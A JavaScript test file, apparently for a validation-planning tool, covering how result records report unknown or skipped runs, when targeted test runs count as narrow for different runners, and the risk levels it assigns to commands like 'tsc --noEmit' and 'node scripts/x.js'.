test('M2 M3 the record keeps UNKNOWN visible in detail, maps NOT_RUN by its real cause, and a reused result states that nothing ran', () => {
  const dir = project({ ...BASE, 'package.json': PKG({ lint: 'node --check src/a.mjs' }) });
  const p = planFor(dir);
  const unknown = runValidationPlan(p, dir, { execute: true, deps: fake(() => ({ status: null, signal: 'SIGKILL' })) });
  assert.deepEqual([unknown.record.result, unknown.record.detail.status, unknown.record.detail.unknown], ['failed', 'UNKNOWN', 1], 'the canonical result words have no "unknown": the status is in detail');
  const idle = runValidationPlan(p, dir, { deps: fake() });
  assert.deepEqual([idle.status, idle.record.result], ['NOT_RUN', 'noop'], 'plan only: nothing is waiting for a yes');
  const a2 = planFor(project({ ...BASE, 'package.json': PKG({ lint: 'npx eslint .' }) }));
  const waiting = runValidationPlan(a2, project({ ...BASE, 'package.json': PKG({ lint: 'npx eslint .' }) }), { execute: true, deps: fake() });
  assert.deepEqual([waiting.status, waiting.record.result], ['NOT_RUN', 'needs-confirmation']);
  const reused = runValidationPlan(p, dir, { execute: true, deps: fake(), previous: { planId: p.planId.slice(0, 8), contentKey: 'abcd1234', status: 'PASS' }, contentKey: 'abcd1234ffff' });
  assert.deepEqual([reused.reused, reused.executed, reused.record.result], [true, [], 'noop']);
  assert.match(reused.evidence.reused.note, /nothing was executed in this invocation/);
  assert.equal(validationRecord({ phase: 'planned', plan: p }).detail.depth, 'V1');
});

test('M4 a targeted run is called narrow only when the runner is known to replace what the script runs', () => {
  assert.deepEqual(pathTargeting('node --test'), { mode: 'append-paths', runner: 'node-test', narrows: true });
  assert.deepEqual(pathTargeting('pytest -q'), { mode: 'append-paths', runner: 'pytest', narrows: true });
  assert.equal(pathTargeting('vitest run').narrows, true);
  assert.equal(pathTargeting('jest').narrows, false, 'jest reads regular expressions');
  assert.equal(pathTargeting('mocha').narrows, false, 'mocha merges the paths with its configured spec');
  assert.equal(pathTargeting('node --test tests/').narrows, false, 'a script that already names a path keeps running it');
  assert.equal(pathTargeting('node --test && echo x'), null);
  const cmd = (script) => ({ id: 'pkg:.:test', type: 'unit-test', source: 'x', origin: 'declared', cwd: '.', argv: ['npm', 'run', 'test'], display: 'npm run test', script, scriptSummary: script, hooks: [], targeting: pathTargeting(script), classification: classifyText(script) });
  const impact = { class: { value: null }, risk: { level: 'LOW' }, requiredValidation: { depth: 'V0', tests: { consumer: [] } }, changedFiles: CHANGED, affectedTests: { direct: ['src/a.test.mjs'] }, bounded: { tests: { truncated: false } }, graph: { used: true }, evidence: { graph: 'known' }, completeness: 'COMPLETE', dimensions: { configuration: { present: false } }, publicSurfaceImpact: { changed: [] } };
  const plan = (script, direct) => planValidation({ task: { taskClass: 'MEDIUM' }, impact: { ...impact, affectedTests: { direct } }, project: { commands: [cmd(script)] } }).actions.find((a) => a.type === 'unit-test');
  const jest = plan('jest', ['src/a.test.mjs']);
  assert.deepEqual([jest.narrow, jest.files], [false, ['src/a.test.mjs']]);
  assert.match(jest.reason, /narrowing is not guaranteed by this runner/);
  const node = plan('node --test', ['src/a.test.mjs']);
  assert.equal(node.narrow, true);
  const bracket = plan('node --test', ['app/[id]/page.test.mjs']);
  assert.ok(!bracket.narrow && !bracket.files, 'a path a glob would misread is not targeted: the whole script runs');
  assert.match(bracket.reason, /characters this runner would read as a pattern/);
  const vitestBracket = plan('vitest run', ['app/[id]/page.test.mjs']);
  assert.equal(vitestBracket.narrow, true, 'vitest filters are plain substrings');
});

test('M5 M6 tsc --noEmit stays A1; a project script run by an interpreter is not A1 merely because it starts with node', () => {
  assert.equal(classifyText('tsc --noEmit').level, 'A1');
  assert.equal(classifyText('node scripts/x.js').level, 'A2');
  assert.equal(classifyText('node --check scripts/x.js').level, 'A1');
});
